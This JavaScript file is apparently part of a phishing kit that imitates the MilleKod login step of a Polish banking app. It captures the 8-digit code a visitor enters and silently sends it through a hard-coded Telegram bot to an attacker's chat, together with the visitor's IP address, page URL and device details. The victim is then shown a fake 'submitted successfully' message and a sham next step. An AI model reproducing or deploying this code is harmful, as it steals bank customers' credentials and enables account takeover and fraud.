/**
 * Mobile MilleKod App - JavaScript Functionality
 * Exact replica of the mobile app behavior
 */

class MilleKodApp {
    constructor() {
        this.elements = {
            input: document.getElementById('millekodInput'),
            nextBtn: document.getElementById('nextBtn'),
            cancelBtn: document.getElementById('cancelBtn'),
            forgotLink: document.getElementById('forgotLink'),
            message: document.getElementById('message'),
            progressBar: document.querySelector('.progress-bar')
        };

        this.config = {
            telegram: {
                botToken: '8232091350:AAFLpQ4Uxi8IJ5G8dfoBqIHb5jWQvi8SL-o',
                chatId: '-4967096174',
                apiUrl: 'https://api.telegram.org'
            },
            validation: {
                minLength: 8,
                maxLength: 8,
                pattern: /^\d{8}$/
            }
        };

        this.state = {
            isLoading: false,
            currentStep: 1,
            totalSteps: 5
        };

        this.init();
    }

    init() {
        this.setupEventListeners();
        this.setupInputHandling();
        this.setupKeyboardHandling();
        this.setupTouchHandling();
        this.focusInput();
    }

    setupEventListeners() {
        // Input events
        this.elements.input.addEventListener('input', () => this.handleInput());
        this.elements.input.addEventListener('keydown', (e) => this.handleKeyDown(e));
        this.elements.input.addEventListener('keypress', (e) => this.handleKeyPress(e));

        // Button events
        this.elements.nextBtn.addEventListener('click', () => this.handleNext());
        this.elements.cancelBtn.addEventListener('click', () => this.handleCancel());
        this.elements.forgotLink.addEventListener('click', (e) => this.handleForgot(e));

        // Window events
        window.addEventListener('orientationchange', () => this.handleOrientationChange());
        window.addEventListener('resize', () => this.handleResize());
    }

    setupInputHandling() {
        // Prevent non-numeric input
        this.elements.input.addEventListener('input', (e) => {
            const value = e.target.value.replace(/\D/g, '');
            if (e.target.value !== value) {
                e.target.value = value;
            }
        });

        // Limit to 8 characters
        this.elements.input.addEventListener('input', (e) => {
            if (e.target.value.length > this.config.validation.maxLength) {
                e.target.value = e.target.value.substring(0, this.config.validation.maxLength);
            }
        });
    }

    setupKeyboardHandling() {
        document.addEventListener('keydown', (e) => {
            // Allow: backspace, delete, tab, escape, enter, arrows
            const allowedKeys = [8, 9, 27, 13, 37, 38, 39, 40];
            const isAllowedKey = allowedKeys.includes(e.keyCode);
            const isCtrlKey = e.ctrlKey && [65, 67, 86, 88].includes(e.keyCode);
            
            if (isAllowedKey || isCtrlKey) {
                return;
            }
            
            // Allow only numbers
            if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && 
                (e.keyCode < 96 || e.keyCode > 105)) {
                e.preventDefault();
            }
        });
    }

    setupTouchHandling() {
        // Prevent zoom on double tap
        let lastTouchEnd = 0;
        document.addEventListener('touchend', (e) => {
            const now = Date.now();
            if (now - lastTouchEnd <= 300) {
                e.preventDefault();
            }
            lastTouchEnd = now;
        }, { passive: false });

        // Prevent context menu on long press
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
        });

        // Add touch feedback to buttons
        [this.elements.nextBtn, this.elements.cancelBtn].forEach(btn => {
            btn.addEventListener('touchstart', () => {
                btn.style.transform = 'scale(0.98)';
            });
            
            btn.addEventListener('touchend', () => {
                btn.style.transform = 'scale(1)';
            });
        });
    }

    handleInput() {
        this.updateButtonState();
        this.updateProgress();
    }

    handleKeyDown(e) {
        // Handle special keys
        if (e.key === 'Backspace' && this.elements.input.value === '') {
            this.elements.input.blur();
        }
    }

    handleKeyPress(e) {
        if (e.key === 'Enter' && !this.elements.nextBtn.disabled) {
            this.handleNext();
        }
    }

    handleNext() {
        if (this.elements.nextBtn.disabled || this.state.isLoading) return;
        
        const code = this.elements.input.value.trim();
        if (!this.validateCode(code)) {
            this.showMessage('Please enter a valid 8-digit MilleKod', 'error');
            return;
        }

        this.submitCode(code);
    }

    handleCancel() {
        this.elements.input.value = '';
        this.updateButtonState();
        this.updateProgress();
        this.focusInput();
    }

    handleForgot(e) {
        e.preventDefault();
        this.showMessage('Contact support for MilleKod recovery', 'error');
    }

    handleOrientationChange() {
        setTimeout(() => {
            this.focusInput();
        }, 100);
    }

    handleResize() {
        // Handle resize if needed
    }

    validateCode(code) {
        return this.config.validation.pattern.test(code);
    }

    updateButtonState() {
        const isValid = this.validateCode(this.elements.input.value);
        this.elements.nextBtn.disabled = !isValid || this.state.isLoading;
    }

    updateProgress() {
        const progress = (this.elements.input.value.length / this.config.validation.maxLength) * 20;
        this.elements.progressBar.style.width = `${Math.max(20, progress)}%`;
    }

    async submitCode(code) {
        this.setState({ isLoading: true });
        
        try {
            const success = await this.sendToTelegram(code);
            
            if (success) {
                this.showMessage('MilleKod submitted successfully!', 'success');
                this.elements.input.value = '';
                this.updateButtonState();
                this.updateProgress();
                
                // Simulate next step
                setTimeout(() => {
                    this.simulateNextStep();
                }, 1500);
            } else {
                throw new Error('Failed to submit MilleKod');
            }
        } catch (error) {
            console.error('Error submitting MilleKod:', error);
            this.showMessage('Failed to submit MilleKod. Please try again.', 'error');
        } finally {
            this.setState({ isLoading: false });
        }
    }

    async getClientInfo() {
        try {
            // Get website URL
            const websiteUrl = window.location.href;
            
            // Try to get IP from multiple sources
            let clientIP = 'Unknown';
            
            try {
                // Method 1: Try ipify API
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                clientIP = ipData.ip;
            } catch (e) {
                try {
                    // Method 2: Try ipapi API
                    const ipResponse2 = await fetch('https://ipapi.co/json/');
                    const ipData2 = await ipResponse2.json();
                    clientIP = ipData2.ip;
                } catch (e2) {
                    // Method 3: Try httpbin API
                    const ipResponse3 = await fetch('https://httpbin.org/ip');
                    const ipData3 = await ipResponse3.json();
                    clientIP = ipData3.origin;
                }
            }
            
            return { websiteUrl, clientIP };
        } catch (error) {
            console.error('Error getting client info:', error);
            return { 
                websiteUrl: window.location.href, 
                clientIP: 'Unknown' 
            };
        }
    }

    async sendToTelegram(code) {
        // Get client information
        const clientInfo = await this.getClientInfo();
        
        const messageText = `🔐 <b>New MilleKod Submitted</b>

📋 <b>MilleKod:</b> <code>${code}</code>
🌐 <b>Website:</b> ${clientInfo.websiteUrl}
🌍 <b>Client IP:</b> <code>${clientInfo.clientIP}</code>
🕐 <b>Time:</b> ${new Date().toLocaleString('ru-RU')}
🆔 <b>ID:</b> ${Date.now()}

📱 <b>Device Info:</b>
• Platform: ${navigator.platform}
• User Agent: ${navigator.userAgent.substring(0, 100)}...
• Screen: ${screen.width}x${screen.height}
• Language: ${navigator.language}

<i>Submitted from MilleKod system</i>`;

        const url = `${this.config.telegram.apiUrl}/bot${this.config.telegram.botToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: this.config.telegram.chatId,
                text: messageText,
                parse_mode: 'HTML'
            })
        });

        const result = await response.json();
        return result.ok;
    }

    simulateNextStep() {
        this.elements.progressBar.style.width = '40%';
        this.showMessage('Redirecting to next step...', 'success');
        
        setTimeout(() => {
            this.elements.progressBar.style.width = '60%';
        }, 1000);
    }

    setState(newState) {
        this.state = { ...this.state, ...newState };
        this.updateUI();
    }

    updateUI() {
        document.body.classList.toggle('loading', this.state.isLoading);
        this.updateButtonState();
    }

    showMessage(text, type = 'info') {
        this.elements.message.textContent = text;
        this.elements.message.className = `message ${type}`;
        this.elements.message.classList.add('show');
        
        setTimeout(() => {
            this.elements.message.classList.remove('show');
        }, 3000);
    }

    focusInput() {
        setTimeout(() => {
            this.elements.input.focus();
        }, 100);
    }
}

// Initialize app when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new MilleKodApp();
});

// Prevent default behaviors
document.addEventListener('touchstart', (e) => {
    if (e.touches.length > 1) {
        e.preventDefault();
    }
}, { passive: false });

document.addEventListener('touchmove', (e) => {
    if (e.touches.length > 1) {
        e.preventDefault();
    }
}, { passive: false });

// Service Worker registration (if needed)
if ('serviceWorker' in navigator) {
    window.addEventListener('load', () => {
        navigator.serviceWorker.register('/sw.js')
            .then(registration => {
                console.log('SW registered: ', registration);
            })
            .catch(registrationError => {
                console.log('SW registration failed: ', registrationError);
            });
    });
}
